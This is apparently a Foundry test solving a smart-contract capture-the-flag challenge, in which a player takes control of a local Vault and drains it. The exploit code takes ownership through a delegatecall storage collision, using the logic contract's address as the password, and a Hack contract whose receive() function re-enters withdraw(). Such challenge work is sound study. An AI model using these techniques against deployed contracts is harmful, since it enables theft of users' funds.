// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);
    event yeah(bytes32 msg, address owner);
    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));
        bytes32 pas = logic.viewPassword();
        emit yeah(pas, logic.owner());
        vault.deposite{value: 0.1 ether}();
        logic.changeOwner(bytes32("0x1234"), palyer);
        logic.changeOwner(bytes32("0x1234"), palyer);
        vm.stopPrank();

    }
    event inputData(bytes32 fake, address owner);

    // function testwithdraw() public {
    //     vm.startPrank(owner);
    //     vault.openWithdraw();
    //     vault.withdraw();
        
    //     vm.stopPrank();

    // }
    function testExploit() public {
    vm.deal(palyer, 1 ether);
    vm.startPrank(palyer);

    // add your hacker code.
    Hack hack = new Hack(address(vault));
    bytes32 data = bytes32(uint256(uint160(address(logic))));
    
    emit inputData(data, logic.owner());


    // console.log(data);
    bytes memory callData = abi.encodeWithSignature("changeOwner(bytes32,address)", data, address(hack));
    address(vault).call(callData);
    hack.enableWithdraw();

    hack.deposit{value: 0.1 ether}();

    hack.withdraw();

    hack.transferToOwner();

    uint256 hackerBalance = palyer.balance;
    console.log(hackerBalance);
    require(vault.isSolve(), "solved");
    vm.stopPrank();
    }
}

// New contract used to attack the contract {Target}
contract Hack {
    address public targetAddr;

    constructor(address _targetAddr) {
        targetAddr = _targetAddr;
    }

    function deposit() public payable {
        targetAddr.call{value: msg.value}(abi.encodeWithSignature("deposite()"));
    }

    function enableWithdraw() public {
        targetAddr.call(abi.encodeWithSignature("openWithdraw()"));
    }

    function withdraw() public {
        targetAddr.call(abi.encodeWithSignature("withdraw()"));
    }

    function transferToOwner() public {
        uint256 amount = address(this).balance;
        payable(msg.sender).call{value: amount}("");
    }

    receive() external payable {
        if (targetAddr.balance > 0) {
            withdraw();
        }
    }
}